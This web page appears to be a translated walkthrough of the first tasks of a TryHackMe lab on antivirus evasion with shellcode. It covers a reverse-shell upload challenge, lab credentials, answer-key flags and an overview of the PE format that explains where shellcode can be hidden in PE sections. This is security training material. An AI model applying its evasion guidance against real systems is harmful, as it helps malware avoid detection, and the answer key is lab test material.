<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Modules/Host Evasions/avevasionshellcode" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">AV Evasion: Shellcode | TryHackMe-CN</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Host Evasions/avevasionshellcode"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" property="og:locale:alternate" content="zh"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="AV Evasion: Shellcode | TryHackMe-CN"><meta data-rh="true" name="description" content="Task 1 Introduction"><meta data-rh="true" property="og:description" content="Task 1 Introduction"><link data-rh="true" rel="icon" href="/TryHackMe-CN/en/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Host Evasions/avevasionshellcode"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Host Evasions/avevasionshellcode" hreflang="en"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode" hreflang="zh"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Modules","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/"},{"@type":"ListItem","position":2,"name":"Host Evasions","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Host Evasions/"},{"@type":"ListItem","position":3,"name":"AV Evasion: Shellcode","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Host Evasions/avevasionshellcode"}]}</script><link rel="alternate" type="application/rss+xml" href="/TryHackMe-CN/en/blog/rss.xml" title="TryHackMe-CN RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/TryHackMe-CN/en/blog/atom.xml" title="TryHackMe-CN Atom Feed"><link rel="stylesheet" href="/TryHackMe-CN/en/assets/css/styles.6c4c8a38.css">
<script src="/TryHackMe-CN/en/assets/js/runtime~main.c6094f51.js" defer="defer"></script>
<script src="/TryHackMe-CN/en/assets/js/main.0aa0d4f3.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/TryHackMe-CN/en/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/TryHackMe-CN/en/"><div class="navbar__logo"><img src="/TryHackMe-CN/en/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/TryHackMe-CN/en/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">TryHackMe-CN</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/TryHackMe-CN/en/docs/Modules/">Tutorial</a><a class="navbar__item navbar__link" href="/TryHackMe-CN/en/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>English</a><ul class="dropdown__menu"><li><a href="/TryHackMe-CN/en/docs/Modules/Host Evasions/avevasionshellcode" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="en">English</a></li><li><a href="/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="zh">简体中文</a></li></ul></div><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/TryHackMe-CN/en/docs/Modules/"><span title="Modules" class="categoryLinkLabel_W154">Modules</span></a><button aria-label="Collapse sidebar category &#x27;Modules&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Attacking LLMs/"><span title="Attacking LLMs" class="categoryLinkLabel_W154">Attacking LLMs</span></a><button aria-label="Expand sidebar category &#x27;Attacking LLMs&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Command Line/"><span title="Command Line" class="categoryLinkLabel_W154">Command Line</span></a><button aria-label="Expand sidebar category &#x27;Command Line&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Container Security/"><span title="Container Security" class="categoryLinkLabel_W154">Container Security</span></a><button aria-label="Expand sidebar category &#x27;Container Security&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Host Evasions/"><span title="Host Evasions" class="categoryLinkLabel_W154">Host Evasions</span></a><button aria-label="Collapse sidebar category &#x27;Host Evasions&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Host Evasions/avevasionshellcode"><span title="AV Evasion: Shellcode" class="linkLabel_WmDU">AV Evasion: Shellcode</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Host Evasions/obfuscationprinciples"><span title="Obfuscation Principles" class="linkLabel_WmDU">Obfuscation Principles</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/"><span title="Memory Analysis" class="categoryLinkLabel_W154">Memory Analysis</span></a><button aria-label="Expand sidebar category &#x27;Memory Analysis&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Microsoft Defender XDR/"><span title="Microsoft Defender XDR" class="categoryLinkLabel_W154">Microsoft Defender XDR</span></a><button aria-label="Expand sidebar category &#x27;Microsoft Defender XDR&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Starters/"><span title="Starters" class="categoryLinkLabel_W154">Starters</span></a><button aria-label="Expand sidebar category &#x27;Starters&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/TryHackMe-CN/en/docs/Networks/"><span title="Networks" class="categoryLinkLabel_W154">Networks</span></a><button aria-label="Expand sidebar category &#x27;Networks&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/TryHackMe-CN/en/docs/"><span title="index" class="linkLabel_WmDU">index</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/TryHackMe-CN/en/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/en/docs/Modules/"><span>Modules</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/en/docs/Modules/Host Evasions/"><span>Host Evasions</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">AV Evasion: Shellcode</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>AV Evasion: Shellcode</h1></header>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-1-introduction">Task 1 Introduction<a href="#task-1-introduction" class="hash-link" aria-label="Direct link to Task 1 Introduction" title="Direct link to Task 1 Introduction" translate="no">​</a></h2>
<p>In this room, we&#x27;ll explore how to build and deliver payloads, focusing on avoiding detection by common AV engines. We&#x27;ll look at different techniques available to us as attackers and discuss the pros and cons of every one of them.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="objectives">Objectives<a href="#objectives" class="hash-link" aria-label="Direct link to Objectives" title="Direct link to Objectives" translate="no">​</a></h3>
<ul>
<li class="">Learn how shellcodes are made.</li>
<li class="">Explore the pros and cons of staged payloads.</li>
<li class="">Create stealthy shellcodes to avoid AV detection.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="prerequisites">Prerequisites<a href="#prerequisites" class="hash-link" aria-label="Direct link to Prerequisites" title="Direct link to Prerequisites" translate="no">​</a></h3>
<p>It is recommended to have some prior knowledge of <a href="https://tryhackme.com/room/introtoav" target="_blank" rel="noopener noreferrer" class="">how antivirus software works</a> and a basic understanding of encryption and encoding. While not strictly required, some knowledge of basic assembly language can also be helpful. Also, we recommend having a basic understanding of reading code and understanding functions (C, C#).</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Click and continue learning! </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-2-challenge">Task 2 Challenge<a href="#task-2-challenge" class="hash-link" aria-label="Direct link to Task 2 Challenge" title="Direct link to Task 2 Challenge" translate="no">​</a></h2>
<p>In this challenge, we prepared a Windows machine with a web application to let you upload your payloads. Once uploaded, the payloads will be checked by an AV and executed if found to be clean of malware. The main goal of this challenge is to evade Antivirus software installed on the VM and capture the flag in the file system. Feel free to try all of the techniques discussed throughout the room by uploading them to <code>http://MACHINE_IP/</code>.</p>
<p>Points to remember:</p>
<ul>
<li class="">Try to combine the techniques discussed in this room.</li>
<li class="">The website supports EXE files only.</li>
<li class="">Once the AV scans the uploaded file and no malicious code is detected, the file gets executed. Thus, if everything is put together correctly, then you should receive a reverse shell.</li>
</ul>
<p><img decoding="async" loading="lazy" alt="AV Challenge Web App" src="/TryHackMe-CN/en/assets/images/image_20251141-214152-b953a19b6109ea2253047988d2567d1d.png" width="829" height="757" class="img_ev3q"></p>
<p>You can ignore the questions for this task for now, but be sure to come back to them once you have successfully bypassed the AV and gained a shell.</p>
<p>Deploy the attached VM to follow up with the content of the room before continuing to the next section! The VM will deploy in-browser and should appear automatically in the Split View. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. If you prefer connecting via RDP, you can do so with the following credentials:</p>
<table><thead><tr><th style="text-align:center">Key</th><th style="text-align:center">Value</th></tr></thead><tbody><tr><td style="text-align:center">Username</td><td style="text-align:center">thm</td></tr><tr><td style="text-align:center">Password</td><td style="text-align:center">Password321</td></tr></tbody></table>
<p>You will also need the AttackBox for some tasks, so this is also a good moment to start it.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Which Antivirus software is running on the VM? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Windows Defender</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the name of the user account to which you have access? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">av-victim</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Establish a working shell on the victim machine and read the file on the user&#x27;s desktop. What is the flag? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{H3ll0-W1nD0ws-Def3nd3r!}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-3-pe-structure">Task 3 PE Structure<a href="#task-3-pe-structure" class="hash-link" aria-label="Direct link to Task 3 PE Structure" title="Direct link to Task 3 PE Structure" translate="no">​</a></h2>
<p>This task highlights some of the high-level essential elements of PE data structure for Windows binaries.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-pe">What is PE?<a href="#what-is-pe" class="hash-link" aria-label="Direct link to What is PE?" title="Direct link to What is PE?" translate="no">​</a></h3>
<p>Windows Executable file format, aka PE (Portable Executable), is a data structure that holds information necessary for files. It is a way to organize executable file code on a disk. Windows operating system components, such as Windows and DOS loaders, can load it into memory and execute it based on the parsed file information found in the PE.</p>
<p>In general, the default file structure of Windows binaries, such as EXE, DLL, and Object code files, has the same PE structure and works in the Windows operating system for both (x86 and x64) CPU architecture.</p>
<p>A PE structure contains various sections that hold information about the binary, such as metadata and links to a memory address of external libraries. One of these sections is the <strong>PE Header</strong>, which contains metadata information, pointers, and links to address sections in memory. Another section is the <strong>Data section</strong>, which includes containers that include the information required for the Windows loader to run a program, such as the executable code, resources, links to libraries, data variables, etc.</p>
<p><img decoding="async" loading="lazy" alt="PE Structure" src="/TryHackMe-CN/en/assets/images/image_20251145-214539-9b952f0ac4f79fd84f8fb336a6f2f1d7.png" width="762" height="555" class="img_ev3q"></p>
<p>There are different types of data containers in the PE structure, each holding different data.</p>
<ol>
<li class=""><strong>.text</strong> stores the actual code of the program</li>
<li class=""><strong>.data</strong> holds the initialized and defined variables</li>
<li class=""><strong>.bss</strong> holds the uninitialized data (declared variables with no assigned values)</li>
<li class=""><strong>.rdata</strong> contains the read-only data</li>
<li class=""><strong>.edata</strong> contains exportable objects and related table information</li>
<li class=""><strong>.idata</strong> imported objects and related table information</li>
<li class=""><strong>.reloc</strong> image relocation information</li>
<li class=""><strong>.rsrc</strong> links external resources used by the program such as images, icons, embedded binaries, and manifest file, which has all information about program versions, authors, company, and copyright!</li>
</ol>
<p>The PE structure is a vast and complicated topic, and we are not going to go into too much detail regarding the headers and data sections. This task provides a high-level overview of the PE structure. If you are interested in gaining more information on the topic, we suggest checking the following THM rooms where the topic is explained in greater detail:</p>
<ul>
<li class=""><a href="https://tryhackme.com/room/windowsinternals" target="_blank" rel="noopener noreferrer" class="">Windows Internals</a></li>
<li class="">Dissecting PE Headers</li>
</ul>
<p>You can also get more in-depth details about PE if you check the <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener noreferrer" class="">Windows PE format</a>&#x27;s Docs website.</p>
<p>When looking at the PE contents, we&#x27;ll see it contains a bunch of bytes that aren&#x27;t human-readable. However, it includes all the details the loader needs to run the file. The following are the example steps in which the Windows loader reads an executable binary and runs it as a process.</p>
<ol>
<li class="">Header sections: DOS, Windows, and optional headers are parsed to provide information about the EXE file. For example,<!-- -->
<ul>
<li class="">The magic number starts with &quot;MZ,&quot; which tells the loader that this is an EXE file.</li>
<li class="">File Signatures</li>
<li class="">Whether the file is compiled for x86 or x64 CPU architecture.</li>
<li class="">Creation timestamp.</li>
</ul>
</li>
<li class="">Parsing the section table details, such as<!-- -->
<ul>
<li class="">Number of Sections the file contains.</li>
</ul>
</li>
<li class="">Mapping the file contents into memory based on<!-- -->
<ul>
<li class="">The EntryPoint address and the offset of the ImageBase.</li>
<li class="">RVA: Relative Virtual Address, Addresses related to Imagebase.</li>
</ul>
</li>
<li class="">Imports, DLLs, and other objects are loaded into the memory.</li>
<li class="">The EntryPoint address is located and the main execution function runs.</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-do-we-need-to-know-about-pe">Why do we need to know about PE?<a href="#why-do-we-need-to-know-about-pe" class="hash-link" aria-label="Direct link to Why do we need to know about PE?" title="Direct link to Why do we need to know about PE?" translate="no">​</a></h3>
<p>There are a couple of reasons why we need to learn about it. First, since we are dealing with packing and unpacking topics, the technique requires details about the PE structure.</p>
<p>The other reason is that AV software and malware analysts analyze EXE files based on the information in the PE Header and other PE sections. Thus, to create or modify malware with AV evasion capability targeting a Windows machine, we need to understand the structure of Windows Portable Executable files and where the malicious shellcode can be stored.</p>
<p>We can control in which Data section to store our shellcode by how we define and initialize the shellcode variable. The following are some examples that show how we can store the shellcode in PE:</p>
<ul>
<li class="">Defining the shellcode as a local variable within the main function will store it in the <strong>.TEXT</strong> PE section.</li>
<li class="">Defining the shellcode as a global variable will store it in the <strong>.Data</strong> section.</li>
<li class="">Another technique involves storing the shellcode as a raw binary in an icon image and linking it within the code, so in this case, it shows up in the <strong>.rsrc</strong> Data section.</li>
<li class="">We can add a custom data section to store the shellcode.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pe-bear">PE-Bear<a href="#pe-bear" class="hash-link" aria-label="Direct link to PE-Bear" title="Direct link to PE-Bear" translate="no">​</a></h3>
<p>The attached VM is a Windows development machine that has the tools needed to parse EXE files and read the details we discussed. For your convenience, we have provided a copy of the PE-Bear software on the Desktop, which helps to check the PE structure: Headers, Sections, etc. PE-Bear provides a graphic user interface to show all relevant EXE details. To load an EXE file for analysis, select <strong>File</strong> -&gt; <strong>Load PEs</strong> (Ctrl + O).</p>
<p><img decoding="async" loading="lazy" alt="PE-Bear: The Main Windows" src="/TryHackMe-CN/en/assets/images/image_20251149-214931-254dc3c9b34342193396d3c17848997c.png" width="607" height="446" class="img_ev3q"></p>
<p>Once a file is loaded, we can see all PE details. The following screenshot shows PE details of the loaded file, including the headers and sections we discussed earlier in this task.</p>
<p><img decoding="async" loading="lazy" alt="PE-Bear a File" src="/TryHackMe-CN/en/assets/images/image_20251149-214947-56046571da1f23011e1aec353a8da742.png" width="809" height="466" class="img_ev3q"></p>
<p>Now it is time to try it out! Load the <strong>thm-intro2PE.exe</strong> file to answer the questions below. The file is located in the following location: <code>c:\Tools\PE files\thm-intro2PE.exe</code>.</p>
